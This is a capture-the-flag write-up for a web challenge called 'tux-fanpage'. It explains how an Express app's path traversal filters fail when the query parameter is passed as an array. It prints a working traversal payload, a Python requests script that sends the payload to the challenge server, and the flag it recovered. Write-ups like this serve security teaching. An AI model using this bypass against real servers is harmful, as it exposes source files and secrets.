# tux-fanpage
I knew this was a path traversal challenge from the `url` immediatly when I saw it. It's typical form of `page?path=index.html` tiped it.
We were also given the backend since there are some filters ther to prevent path traversal.
## Source code
```js
app.get('/page', (req, res) => {

    let path = req.query.path

    //Handle queryless request
    if(!path || !strip(path)){
        res.redirect('/page?path=index.html')
        return
    }

    path = strip(path)

    path = preventTraversal(path)

    res.sendFile(prepare(path), (err) => {
        if(err){
            if (! res.headersSent) {
                try {
                    res.send(strip(req.query.path) + ' not found')
                } catch {
                    res.end()
                }
            }
        }
    })
})
```
This is where we take in the input and renders out the page. But before `sendFile()` is called, the string must go through `strip` , `preventTraversal` and `prepare`
### preventTraversal
Here it checks if `dir` contains any `../` or `..\\` it removes it if it exists.
```js
//Prevent directory traversal attack
function preventTraversal(dir){
    if(dir.includes('../')){
        let res = dir.replace('../', '')
        return preventTraversal(res)
    }

    //In case people want to test locally on windows
    if(dir.includes('..\\')){
        let res = dir.replace('..\\', '')
        return preventTraversal(res)
    }
    return dir
}
```
### prepare
This function will create an absolute path using `./public/` and `dir` by concatenating them.
```js
//Get absolute path from relative path
function prepare(dir){
    return path.resolve('./public/' + dir)
}
```
### strip
Strip will get rid of all leading non-alphanumeric elements.
```js
//Strip leading characters
function strip(dir){
    const regex = /^[a-z0-9]$/im

    //Remove first character if not alphanumeric
    if(!regex.test(dir[0])){
        if(dir.length > 0){
            return strip(dir.slice(1))
        }
        return ''
    }

    return dir
}
```
## My attempts
First, I thought tha I could bypass the filters with wired encodings, but that wouldn't work here since it will need some sort of special character to work and `strip` takes care of it.  
Then I tried to do stuff within in the `assets` folder where all the images and resources are stored. No luck.
Then I say something that hinted me
## inputs
When I was closely checking the `strip` function, I saw something interesting:
```js
dir[0]
```
This seemingly checks the first character of a string, but that's only the case if we input a string. What if we send in an array? Well in that case, `strip` will only check the first element instead of the first character.
## arrays
Then I experimented with arrays by running commands in the `nodejs` console. And I found out that we could bypass the filters.  
For `preventTraversal` if we pass in an arrya to `inclues()` we check each element, instead of all characers. In this case if our paylaod is not pure `../` we could by pass it.  
For `prepare` I experimented with concatenation between string and arrays and found that it will just render the array elements with `','`.  

## Payload
Consider this payloadY:
```js
['1','/','/../../../index.js']
```
The `'1'` solves the `strip` filter, then by manipulating and testing the concatenation, we get
```
./public/+['1','/','/../../../index.js'] =
./public/1,/../../../index.js
```
which is perfect for us. But how do we input an array?
## input arrays
We could use the python requests library or we could do it by hand. Heres my python script and the printed out url.
```python
import requests
payload = {'path': ['1','/','/../../../index.js']}
r = requests.get('https://tux-fanpage.2020.redpwnc.tf/page', params=payload)
print(r.url)
print(r.text)
```
The url:
```
https://tux-fanpage.2020.redpwnc.tf/page?path=1&path=%2F&path=%2F..%2F..%2F..%2Findex.js
```
## Flag
```
const flag = 'flag{tr4v3rsal_Tim3}'
```
